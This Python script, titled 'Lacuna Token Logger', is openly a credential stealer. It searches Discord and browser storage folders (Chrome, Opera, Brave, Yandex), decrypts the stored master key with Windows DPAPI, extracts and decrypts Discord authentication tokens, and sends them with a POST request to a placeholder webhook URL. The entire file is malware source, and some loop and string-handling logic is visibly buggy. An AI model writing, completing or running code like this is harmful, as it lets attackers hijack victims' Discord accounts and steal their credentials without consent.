"""
Lacuna 'Token Logger'
"""
import os, requests
from base64 import b64decode
from os import listdir
from re import findall
from json import loads
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

' Lacuna Objects '
TOKENS = []
CLEANED = []
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return None
    
' Token Logging '
for platform, path in PATHS.items():
    path += "\\Local Storage\\leveldb"
    tokens = []
    try:
        for platform, path in PATHS.items():
            if not os.path.exists(path): continue
            
            ' Read Files '
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            
            ' Fetch Tokens '
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
                    
            ' Format Tokens '
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in CLEANED:
                    CLEANED.append(i)
                    
            ' Decrypt & Return '
            for token in CLEANED:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                    if tok == None or tok in TOKENS:
                        continue
                    # print("Token:", tok)
                    TOKENS.append(tok)
                except Exception as e:
                    # print("Decryption Issue:", e)
                    continue
    except:
        continue
    
' Send to Webhook '
requests.post("WEBHOOK_URL", json={"content": str(TOKENS)})